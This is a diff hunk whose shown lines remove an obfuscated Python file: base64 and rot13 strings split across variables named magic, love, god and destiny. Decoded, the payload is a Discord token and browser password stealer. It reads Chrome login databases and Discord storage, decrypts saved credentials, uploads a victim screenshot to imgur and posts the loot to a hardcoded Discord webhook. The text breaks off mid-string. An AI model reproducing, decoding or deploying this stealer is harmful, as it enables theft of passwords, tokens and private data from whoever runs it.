@@ -1,8 +1,409 @@
-import base64, codecs
-magic = 'aW1wb3J0IG9zDQppbXBvcnQgc3VicHJvY2Vzcw0KDQojIEZ1bmN0aW9uIHRvIGluc3RhbGwgbWlzc2luZyBsaWJyYXJpZXMNCmRlZiBpbnN0YWxsX3BhY2thZ2UocGFja2FnZSk6DQogICAgdHJ5Og0KICAgICAgICBzdWJwcm9jZXNzLmNoZWNrX2NhbGwoW3N5cy5leGVjdXRhYmxlLCAiLW0iLCAicGlwMyIsICJpbnN0YWxsIiwgcGFja2FnZV0pDQogICAgZXhjZXB0IHN1YnByb2Nlc3MuQ2FsbGVkUHJvY2Vzc0Vycm9yOg0KICAgICAgICBwcmludChmIkZhaWxlZCB0byBpbnN0YWxsIHtwYWNrYWdlfS4gUGxlYXNlIHRyeSBtYW51YWxseS4iKQ0KDQojIFRyeS1leGNlcHQgYmxvY2tzIGZvciBpbXBvcnRpbmcgYW5kIGluc3RhbGxpbmcgcGFja2FnZXMNCnRyeToNCiAgICBpbXBvcnQgYnJvd3Nlcl9jb29raWUzIGFzIHN0ZWFsDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgaW5zdGFsbF9wYWNrYWdlKCJicm93c2VyLWNvb2tpZTMiKQ0KDQp0cnk6DQogICAgaW1wb3J0IHJlcXVlc3RzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgaW5zdGFsbF9wYWNrYWdlKCJyZXF1ZXN0cyIpDQoNCnRyeToNCiAgICBpbXBvcnQgYmFzZTY0DQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgaW5zdGFsbF9wYWNrYWdlKCJiYXNlNjQiKQ0KDQp0cnk6DQogICAgaW1wb3J0IHJhbmRvbQ0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIGluc3RhbGxfcGFja2FnZSgicmFuZG9tIikNCg0KdHJ5Og0KICAgIGltcG9ydCBzdHJpbmcNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBpbnN0YWxsX3BhY2thZ2UoInN0cmluZyIpDQoNCnRyeToNCiAgICBpbXBvcnQgc3VicHJvY2Vzcw0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIGluc3RhbGxfcGFja2FnZSgic3VicHJvY2VzcyIpDQoNCnRyeToNCiAgICBpbXBvcnQgemlwZmlsZQ0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIGluc3RhbGxfcGFja2FnZSgiemlwZmlsZSIpDQoNCnRyeToNCiAgICBpbXBvcnQgc2h1dGlsDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgaW5zdGFsbF9wYWNrYWdlKCJzaHV0aWwiKQ0KDQp0cnk6DQogICAgaW1wb3J0IGRob29rcw0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIGluc3RhbGxfcGFja2FnZSgiZGhvb2tzIikNCg0KdHJ5Og0KICAgIGltcG9ydCBvcw0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIGluc3RhbGxfcGFja2FnZSgib3MiKQ0KDQp0cnk6DQogICAgaW1wb3J0IHJlDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgaW5zdGFsbF9wYWNrYWdlKCJyZSIpDQoNCnRyeToNCiAgICBpbXBvcnQgc3lzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgaW5zdGFsbF9wYWNrYWdlKCJzeXMiKQ0KDQp0cnk6DQogICAgaW1wb3J0IHNxbGl0ZTMNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBpbnN0YWxsX3BhY2thZ2UoInNxbGl0ZTMiKQ0KDQp0cnk6DQogICAgaW1wb3J0IGpzb24NCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBpbnN0YWxsX3BhY2thZ2UoImpzb24iKQ0KDQp0cnk6DQogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycyBpbXBvcnQgQ2lwaGVyLCBhbGdvcml0aG1zLCBtb2Rlcw0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIGluc3RhbGxfcGFja2FnZSgiY3J5cHRvZ3JhcGh5IikNCg0KdHJ5Og0KICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmNpcGhlcnMuYWVhZCBpbXBvcnQgQUVTR0NNDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgaW5zdGFsbF9wYWNrYWdlKCJjcnlwdG9ncmFwaHkiKQ0KDQp0cnk6DQogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzIGltcG9ydCBkZWZhdWx0X2JhY2tlbmQNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBpbnN0YWxsX3BhY2thZ2UoImNyeXB0b2dyYXBoeSIpDQoNCnRyeToNCiAgICBmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUw0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIGluc3RhbGxfcGFja2FnZSgicHljcnlwdG9kb21lIikNCg0KdHJ5Og0KICAgIGZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUsIGI2NGVuY29kZQ0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIGluc3RhbGxfcGFja2FnZSgiYmFzZTY0IikNCg0KdHJ5Og0KICAgIGZyb20gZGhvb2tzIGltcG9ydCBXZWJob29rLCBFbWJlZCwgRmlsZQ0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIGluc3RhbGxfcGFja2FnZSgiZGhvb2tzIikNCg0KdHJ5Og0KICAgIGZyb20gUElMIGltcG9ydCBJbWFnZUdyYWIgYXMgaW1hZ2UNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBpbnN0YWxsX3BhY2thZ2UoIlBpbGxvdyIpDQoNCnRyeToNCiAgICBmcm9tIHN1YnByb2Nlc3MgaW1wb3J0IFBvcGVuLCBQSVBFDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgaW5zdGFsbF9wYWNrYWdlKCJzdWJwcm9jZXNzIikNCg0KdHJ5Og0KICAgIGZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgaW5zdGFsbF9wYWNrYWdlKCJqc29uIikNCg0KdHJ5Og0KICAgIGZyb20gc2h1dGlsIGltcG9ydCBjb3B5ZmlsZQ0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIGluc3RhbGxfcGFja2FnZSgic2h1dGlsIikNCg0KdHJ5Og0KICAgIGZyb20gc3lzIGltcG9ydCBhcmd2DQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgaW5zdGFsbF9wYWNrYWdlKCJzeXMiKQ0KDQoNCkRCUCA9IHInR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxMb2dpbiBEYXRhJw0KQURQID0gb3MuZW52aXJvblsnTE9DQUxBUFBEQVRBJ10NCg0KDQpkZWYgc25pZmYocGF0aCk6DQogICAgcGF0aCArPSAnXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJw0KDQogICAgdG9rZW5zID0gW10NCiAgICB0cnk6DQogICAgICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToNCiAgICAgICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhb'
-love = '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'
-god = 'ogJXNcbnZhbHVlID0+IDogJXNcbls9PT09PT09PT09PT09PT09PT1dXG5cbicgJSAoaG9zdCwgbmFtZSwgdmFsdWUpDQogICAgICAgICAgICBzZWxmLnBhc3N3b3JkTGlzdC5hcHBlbmQoX2luZm8pDQogICAgICAgIGNvbm4uY2xvc2UoKQ0KICAgICAgICBvcy5yZW1vdmUoZGJfZmlsZSkNCg0KICAgIGRlZiBjZGVjcnlwdChzZWxmLCBlbmNyeXB0ZWRfdHh0KToNCiAgICAgICAgaWYgc3lzLnBsYXRmb3JtID09ICd3aW4zMic6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgaWYgZW5jcnlwdGVkX3R4dFs6NF0gPT0gYidceDAxXHgwMFx4MDBceDAwJzoNCiAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX3R4dCA9IGRwYXBpKGVuY3J5cHRlZF90eHQpDQogICAgICAgICAgICAgICAgICAgIHJldHVybiBkZWNyeXB0ZWRfdHh0LmRlY29kZSgpDQogICAgICAgICAgICAgICAgZWxpZiBlbmNyeXB0ZWRfdHh0WzozXSA9PSBiJ3YxMCc6DQogICAgICAgICAgICAgICAgICAgIGRlY3J5cHRlZF90eHQgPSBkZWNyeXB0aW9ucyhlbmNyeXB0ZWRfdHh0KQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3R4dFs6LTE2XS5kZWNvZGUoKQ0KICAgICAgICAgICAgZXhjZXB0IFdpbmRvd3NFcnJvcjoNCiAgICAgICAgICAgICAgICByZXR1cm4gTm9uZQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcGFzcw0KDQogICAgZGVmIHNhdmVkKHNlbGYpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICB3aXRoIG9wZW4ocidDOlxQcm9ncmFtRGF0YVxwYXNzd29yZHMudHh0JywgJ3cnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOg0KICAgICAgICAgICAgICAgIGYud3JpdGVsaW5lcyhzZWxmLnBhc3N3b3JkTGlzdCkNCiAgICAgICAgZXhjZXB0IFdpbmRvd3NFcnJvcjoNCiAgICAgICAgICAgIHJldHVybiBOb25lDQoNCg0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCiAgICBtYWluID0gY2hyb21lKCkNCiAgICB0cnk6DQogICAgICAgIG1haW4uY2hyb21lZGIoKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0KICAgIG1haW4uc2F2ZWQoKQ0KDQoNCiMgd2ViaG9vayBmdW5jdGlvbmFsaXR5ID0+IGNvbGxlY3QgcmVzdCBvZiBzcGVjaWZpZWQgZGF0YSwgc2VuZCBpdCB0byBvdXIgd2ViaG9vaw0KZGVmIHVwbG9hZCgpOg0KICAgIHRyeToNCiAgICAgICAgIiIiY3JlYXRlIGEgcmFuZG9taXplZCBuYW1lIGZvciB1cGxvYWRpbmcgcHVycG9zZXMgOiByZW1vdmVzIHRoZSBwb3NzaWJpbGl0eSBvZiByZXBlYXQgaW1hZ2VzIGJlaW5nIGVtYmVkZGVkIiIiDQogICAgICAgIG5hbWUgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmFzY2lpX2xldHRlcnMpIGZvciBpIGluIHJhbmdlICgyMSkpDQoNCiAgICAgICAgIiIidXBsb2FkIG91ciB2aWN0aW0ncyBkZXNrdG9wIGltYWdlIHRvIGltZ3VyID0+IHJldHVybiB0aGUgaW1hZ2UgbGluayBmb3IgbGF0ZXIgdXNhZ2UiIiINCiAgICAgICAgaW1ndXIgPSByZXF1ZXN0cy5wb3N0KA0KICAgICAgICAgICAgcidodHRwczovL2FwaS5pbWd1ci5jb20vMy91cGxvYWQuanNvbicsIA0KICAgICAgICAgICAgaGVhZGVycyA9IHsiQXV0aG9yaXphdGlvbiI6ICJDbGllbnQtSUQgZmJjYjc1NWMxNWJjMzExIn0sDQogICAgICAgICAgICBkYXRhID0gew0KICAgICAgICAgICAgICAgICdrZXknOiAnZmJjYjc1NWMxNWJjMzExJywgDQogICAgICAgICAgICAgICAgJ2ltYWdlJzogYjY0ZW5jb2RlKG9wZW4ocidDOlxQcm9ncmFtRGF0YVxzY3JlZW5zaG90LmpwZycsICdyYicpLnJlYWQoKSksDQogICAgICAgICAgICAgICAgJ3R5cGUnOiAnYmFzZTY0JywNCiAgICAgICAgICAgICAgICAnbmFtZSc6IGYne25hbWV9LmpwZycsDQogICAgICAgICAgICAgICAgJ3RpdGxlJzogZid7bmFtZX0nfSkNCiAgICAgICAgaW1hZ2UgPSBpbWd1ci5qc29uKClbJ2RhdGEnXVsnbGluayddDQogICAgICAgIHJldHVybiBpbWFnZQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0KDQoNCmRlZiBiZWFtZWQoKToNCiAgICBob29rID0gV2ViaG9vaygnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4NTk3NDA5NDg4OTYxNTM2MC9QOW8xSUY4c0xYQ0RobmtjQ3V3WWxGbmxNeWdzSDJfVHlybHVqZHM2YXlpYzFxUUNvcEdudVdaYmNyTFlRSGxHYjdvRScpDQogICAgdHJ5Og0KICAgICAgICBob3N0bmFtZSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikudGV4dA0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0KDQoNCiAgICBsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykNCiAgICByb2FtaW5nID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykNCiAgICBwYXRocyA9IHsNCiAgICAgICAgJ0Rpc2NvcmQnOiByb2FtaW5nICsgJ1xcRGlzY29yZCcsDQogICAgICAgICdEaXNjb3JkIENhbmFyeSc6IHJvYW1pbmcgKyAnXFxkaXNjb3JkY2FuYXJ5JywNCiAgICAgICAgJ0Rpc2NvcmQgUFRCJzogcm9hbWluZyArICdcXGRpc2NvcmRwdGInLA0KICAgICAgICAnR29vZ2xlIENocm9tZSc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdCcsDQogICAgICAgICdPcGVyYSc6IHJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlJywNCiAgICAgICAgJ0JyYXZlJzogbG9jYWwgKyAnXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQnLA0KICAgICAgICAnWWFuZGV4JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCcNCiAgICB9DQoNCiAgICBtZXNzYWdlID0gJ1xuJw0KICAgIGZvciBwbGF0Zm9ybSwgcGF0aCBpbiBwYXRocy5pdGVtcygpOg0KICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6DQogICAgICAgICAgICBjb250aW51ZQ0KDQogICAgICAgIG1lc3NhZ2UgKz0gJ2BgYCcNCg0KICAgICA'
-destiny = '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